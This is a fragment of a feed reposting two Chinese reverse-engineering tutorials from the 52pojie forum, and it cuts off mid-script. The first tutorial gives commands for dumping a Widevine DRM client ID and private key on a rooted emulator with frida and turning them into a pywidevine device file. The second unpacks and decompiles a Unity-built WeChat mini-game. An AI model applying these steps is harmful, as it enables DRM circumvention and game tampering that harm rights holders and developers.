src="https://wechat2rss.xlab.app/img-proxy/?k=5e3f18f4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOQuSmOicZgGUYYyhVya1QoZPYs7a57RjhWgBvPMDJ9oe6KsfnhNa6AMw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>安装pixel 6 (系统一定要选Pie，不然frida-server会不成功)</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=e2c7c4da&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOGq8lZr7Z5NCDSLV9npTP9m3VlJJhSy21ichmzCkDe6t1SRu9Y5lPfuQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=2d5bebc7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOMqDn2VeyClibicCc7j5QVeFKeuxbXVg39PxhRKoxvmm4pDxnfmMVJfHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1055" /><br /><span>然后启动</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=da1a497a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgO2qGPqzW6xFNiaU5eBZ8Ng8hR7S7AoP2BbFehFvm4h1SD70KFMnhWcmg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="565" /><br /><span>启动成功后在Window安装脚本</span><code style="font-family: Consolas, Monaco, ;">pip install frida</code><span>和</span><code style="font-family: Consolas, Monaco, ;">pip install frida-tools</code><br /><span>接下来输入</span><code style="font-family: Consolas, Monaco, ;">pip list</code><span>查看包版本</span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=77128e87&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgO3gX6Tcb0GuV0Ea4T0ak2OqLvOZIryBw5BWwNCoRicXueyPOvE3cxuSA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="289" /><br /><span>然后下载对应版本的frida-server</span><br /><code style="font-family: Consolas, Monaco, ;">https://github.com/frida/frida/releases</code><br /><span>我的是16.2.5则去下</span><code style="font-family: Consolas, Monaco, ;">frida-server-16.2.5-android-x86.xz</code><span>然后解压得到frida-server-16.2.5-android-x86</span><br /><span>然后输入</span><br /><code style="font-family: Consolas, Monaco, ;">adb push C:\Users\lihengdao\Downloads\frida-server-16.2.5-android-x86 /sdcard</code><br /><span>移动之后输入</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">adb.exe shell su mv /sdcard/frida-server-16.2.5-android-x86 /data/local/tmp chmod +x /data/local/tmp/frida-server-16.2.5-android-x86<br />/data/local/tmp/frida-server-16.2.5-android-x86</code></pre><p>运行有点报错很正常，直接继续<br />拉取项目<code style="font-family: SFMono-Regular, Consolas, ;">https://github.com/wvdumper/dumper</code><br />安装依赖<code style="font-family: SFMono-Regular, Consolas, ;">pip3 install -r requirements.txt</code><br />然后降级一下protobuf <code style="font-family: SFMono-Regular, Consolas, ;">pip install protobuf==3.20.*</code><br />输入<code style="font-family: SFMono-Regular, Consolas, ;">python .\dump_keys.py</code>运行，注意运行frida-server的窗口不要关显示Hook completed就成功了<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=795312fb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOvAfb8wyasTiaNvXvXA64Lddw8WgTlOhfuCbrBXMlgfPBVNNJ7gbdK1g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>接下来在Andriod Studio的Pixel模拟器访问https://bitmovin.com/demos/drm</span><br /><span>小提示，这里建议设置代{过}{滤}理，模拟器的回环代{过}{滤}理是10.0.2.2</span><br /><span>将wifi的设置里proxy设置上相应的回环地址和端口即可</span><br /><span>如果网络不好加载不出来视频会存在bin和pem文件的！</span>https://developer.android.com/studio/run/emulator-networking?hl=zh-cn<br /><span>视频没刷出来就多试试</span><br /><span>大陆网有点卡</span><br /><span>当出现视频进度点播放</span><br /><span>就会在dumper-main目录里生成劫持到的文件</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=52ed901d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOIl4PELzltunwGB3PDzuziaoIKFPL8dZrU9QtlBDunqOr1Ca7wIUOzCQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="816" /><br /><span>然后去生成的文件目录输入</span><code style="font-family: Consolas, Monaco, ;">pywidevine create-device -k private_key.pem -c client_id.bin -t "CHROME" -l 3 -o wvd</code><br /><span>wvd驱动文件生成成功！</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=c45577e5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgObtj1MBia1t0GXibcdv3BhrGLeH1rjMLibkVjLkric7JVYHyDCdaOnyWl0w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="504" /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1939931-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 05 Jul 2024 14:51:10 +0800</pubDate>
</item>
<item>
<title>【Web逆向】浅谈逆向Unity导出的vx小游戏的思路</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140819&amp;idx=1&amp;sn=56c63798c4dd6827816fdbb683a770e7&amp;chksm=bd50a2878a272b918042530d4346275e9cb8703c53bb2e207d4b3447354486b3d6279f50b7db&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140819&amp;idx=1&amp;sn=56c63798c4dd6827816fdbb683a770e7&amp;chksm=bd50a2878a272b918042530d4346275e9cb8703c53bb2e207d4b3447354486b3d6279f50b7db&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-04 15:26</span> <span style="display: inline-block;">北京</span>
</p>

<p>刷抖音时突然蹦出个广告，还不小心点进去了，就试玩了一下，发现还挺有趣的，嗯，可是玩了一小会后发现打不过了，还得充钱才能变得更强？？？于是直接忍不了了 直接开机，上号!!!</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=a9b61b74&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRyicBFEEUtDDKx2Y9Ecgb8iaAFtVX9QKiaUBptIIib6K6LcibxhSqLSaIZoA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>小沫子</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5bda91da&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRqcyOKia5s36IrKHFCOA0dGU0v6CicQuj2xD3Wwfn4ZHGmnibIQxicpkr6g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p><span style="font-weight: 700;">用到的工具比较多，我把全部链接都放文末</span></p></li></ul><blockquote><p style="margin-bottom: 15px;">背景：刷抖音时突然蹦出个广告，还不小心点进去了就试玩了一下，发现还挺有趣的，嗯可是玩了一小会后发现打不过了，还得充钱才能变得更强？？？<br />于是直接忍不了了 <span style="font-weight: 700;">直接开机，上号!!!</span></p></blockquote><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=254dec62&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRN9QgZIwu0sNicQ9qOOzCC5zZsYrbWjNf9iaTG5y4NCBxgyEVAOS2AJFg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=dd640def&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRCZzpylDCX5ib2bNUW83siaparrcv8hAuIibbQvyYeZicobAtqWLzMXeLbA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>初步分析小游戏</h2><ul><li style="margin-left: 2px;"><p>打开对应的<code style="font-family: SFMono-Regular, Consolas, ;">wxapkg</code>目录<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a088e053&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlREHszjRRAAbOObNP2QsRslQoVRyGhemOGToWFyo68PboTrYbWAL4Kqg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;">解包</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">unveilr wx -f  <span style="color: rgb(168, 255, 96);">"D:\WeChat Files\WeChat Files\Applet\wxxxxxxx\34"</span></code></pre></li><li style="margin-left: 2px;"><p>到这一步可以确定是<code style="font-family: SFMono-Regular, Consolas, ;">unity</code>项目转成的小游戏了<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ea35cf84&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRIp3D5IC5KhWDbUPhWAzVIGUFA1111wicsRdWCvP3L7gic0vagibMqbAUg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>当然你通过解包出来的目录也是可以看出来的<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=15021f2a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRw14Bpuqa8DelibYgibv4j4MDR5aS7TCQwMOOH2KTgrn2LTcFmr9iaGO4g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>稍微翻了下代码，可以确定小游戏逻辑都在 <code style="font-family: SFMono-Regular, Consolas, ;">wasmcode</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">wasmcode1</code><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=325298d4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlR1QlDMrsRbEI691YhJ6Y1mswcZC3EeJEibqIYzUGWdMIYNrgy0HSfInQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=14d76081&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRWyiaxxYMyOujr6tY54icQN0hZqB3nnvEUyGQzibWHE5dibUzFOxE2KkLyQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ul><h2>初步分析unity相关文件</h2><ul><li style="margin-left: 2px;"><p>可以看到这里都是 br 为后缀，这是使用brotli压缩的文件</p></li><li style="margin-left: 2px;"><p>使用<code style="font-family: SFMono-Regular, Consolas, ;">brotli.exe</code>解压缩<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a8bdc99c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRlbciaDhL5F8Lv2CDNVUcUh6wYicibe5AH1gicibSKeMQwNcGHPfPdIqCmIw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>另一个文件夹同理</p></li><li style="margin-left: 2px;"><p>这样我们就得到了wasm文件了</p></li><li style="margin-left: 2px;"><p>这里可以直接拖进 <code style="font-family: SFMono-Regular, Consolas, ;">ida</code> 或者 <code style="font-family: SFMono-Regular, Consolas, ;">Ghidra</code></p></li><li style="margin-left: 2px;"><p>我这里使用 <code style="font-family: SFMono-Regular, Consolas, ;">Ghidra</code>，因为 ida 的 wasm 插件好像有点问题</p></li><li style="margin-left: 2px;"><p>怎么安装wasm插件这里我就不赘述了</p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;">这里我把解包得到的wasm改个名：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">xxx.code.import.unityweb.wasm -&gt; import.wasmxxx.code.unityweb.wasm -&gt; main.wasm<br />wasmcode1/xxx.code.unityweb.wasm -&gt; sub.wasm</code></pre></li><li style="margin-left: 2px;"><p>然后一并拖入 <code style="font-family: SFMono-Regular, Consolas, ;">Ghidra</code><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=1f90256c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRfkVkD66F9BgqdW8xTvFRx5GdwwoxE63ibyq3qAmDWMTfqVhFo7q14mg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>等他分析好（<em style="color: rgb(102, 102, 102);">这里可能要一些时间</em>），出现一堆 jxxx 的函数，这根本没法看啊<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=40d89e28&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRgg9V7sjCNuw34uTMMP0kggxbRwhHwCWVCDuibeTXBM2tEb2YezxAxyQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>接下来尝试恢复wasm的符号信息</p></li></ul><h2>尝试恢复wasm的符号信息</h2><ul><li style="margin-left: 2px;"><p>一般现在的unity都是用 <code style="font-family: SFMono-Regular, Consolas, ;">IL2cpp</code>导出了，<code style="font-family: SFMono-Regular, Consolas, ;">Mono</code> 估计很少用了吧</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Il2CppDumper</code> 能将使用 <code style="font-family: SFMono-Regular, Consolas, ;">IL2cpp</code>打包的文件还原出 <code style="font-family: SFMono-Regular, Consolas, ;">script.json</code>，这里面存着符号信息</p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;">所以我们直接使用 <code style="font-family: SFMono-Regular, Consolas, ;">Il2CppDumper</code> 尝试导出</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt;</code></pre></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Il2CppDumper</code> 需要 <code style="font-family: SFMono-Regular, Consolas, ;">global-metadata.dat</code> 文件</p></li><li style="margin-left: 2px;"><p>那这个文件哪里找呢？小游戏的<code style="font-family: SFMono-Regular, Consolas, ;">wxapkg</code>包内没有</p></li><li style="margin-left: 2px;"><p>那应该是远程下载的，只能是找缓存路径了</p></li><li style="margin-left: 2px;"><p>经过研究，发现可疑文件<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=e30880ae&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRiaO1rhaCCykHj77nEfibJC4aKqNGcebhbuDXwx3zLNaKtbuMWZddwHvA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>这又是个二进制文件，需要解析出来</p></li><li style="margin-left: 2px;"><p>这里使用 <code style="font-family: SFMono-Regular, Consolas, ;">unityweb</code> 将他导出来<br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a6029fa9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlR48XGe9LmokPh3SjEa1Sia3XmyK9C6kLicXhnnu3mCcjapnC4lygic4iaug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d21a1d9b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRqVbHoZlav9BZptTyWElI6lTfvqCxw6calzlH76q56LVSStgEv3xanA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>有了 <code style="font-family: SFMono-Regular, Consolas, ;">global-metadata.dat</code>就能导出<code style="font-family: SFMono-Regular, Consolas, ;">script.json</code> 等文件了</p></li></ul><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=46b0fcb1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRH5UZxRhdpZ5lkW5aAodZTBHdxUWPnajb7MhYursbC8GYqicPn8GV3UQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p>然后怎么恢复到 <code style="font-family: SFMono-Regular, Consolas, ;">Ghidra</code> 可以看下面这篇文章，讲的很好</p></li><li style="margin-left: 2px;"><p>https://www.cnblogs.com/algonote/p/15596459.html<br /><span style="font-weight: 700;">但是</span><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ac68fb44&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKtt2RBibtkN5YCW22Pl5RlRRH4VVbRnkIwFWlVRY0SKvn8Tic5N1icPiaRqIupDaaFGoettDy6VXekcg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>这里并不太适合导出成vx小游戏的项目</p></li><li style="margin-left: 2px;"><p>这里需要魔改 <code style="font-family: SFMono-Regular, Consolas, ;">ghidra_wasm.py</code></p></li><li style="margin-left: 2px;"><p>经过分析，问题出在，他的动态调用的偏移是存在 <code style="font-family: SFMono-Regular, Consolas, ;">import.wasm</code> 里面的</p></li><li style="margin-left: 2px;"><p>所以我们先把它的偏移转换出来</p></li><li style="margin-left: 2px;"><p>这里我直接贴我的脚本</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// restore.js</span><br /><span style="color: rgb(150, 203, 254);">const</span> fs = require(<span style="color: rgb(168, 255, 96);">'fs'</span>)<br /><span style="color: rgb(150, 203, 254);">const</span> http = require(<span style="color: rgb(168, 255, 96);">'http'</span>)<br /><span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">Scripts</span> = <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">parse</span>(fs.<span style="color: rgb(255, 255, 182);">readFileSync</span>(<span style="color: rgb(168, 255, 96);">'./script.json'</span>, <span style="color: rgb(168, 255, 96);">'utf8'</span>))<br /><span style="color: rgb(150, 203, 254);">const</span> splitWasmBytes = fs.<span style="color: rgb(255, 255, 182);">readFileSync</span>(<span style="color: rgb(168, 255, 96);">'./import.wasm'</span>)<br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />  <span style="color: rgb(150, 203, 254);">const</span> {instance} = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">WebAssembly</span>.<span style="color: rgb(255, 255, 182);">instantiate</span>(splitWasmBytes);<br />  <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">getRedirIndex</span> = a =&gt; instance.exports[<span style="color: rgb(168, 255, 96);">'wasm_split.__wasm_split_getRedirIndex'</span>](a) &amp; <span style="color: rgb(255, 115, 253);">268435455</span><br />  <span style="color: rgb(255, 255, 182);">Scripts</span>.ScriptMethod.<span style="color: rgb(255, 255, 182);">forEach</span>(item =&gt; {<br />    item.FuntionName = <span style="color: rgb(168, 255, 96);">`j<span style="color: rgb(218, 239, 163);">${getRedirIndex(item.Address)}</span>`</span>  })<br />  fs.<span style="color: rgb(255, 255, 182);">writeFileSync</span>(<span style="color: rgb(168, 255, 96);">'./script2.json'</span>, <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(<span style="color: rgb(255, 255, 182);">Scripts</span>), <span style="color: rgb(168, 255, 96);">'utf8'</span>)}<br /><span style="color: rgb(255, 255, 182);">main</span>()</code></pre><ul><li style="margin-left: 2px;"><p>我先把对应的偏移函数名写到 <code style="font-family: SFMono-Regular, Consolas, ;">script2.json</code></p></li><li style="margin-left: 2px;"><p>然后魔改  <code style="font-family: SFMono-Regular, Consolas, ;">ghidra_wasm.py</code></p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);"># -*- coding: utf-8 -*-</span><br /><span style="color: rgb(150, 203, 254);">import</span> json<br /><span style="color: rgb(150, 203, 254);">import</span> recurrentProgram = 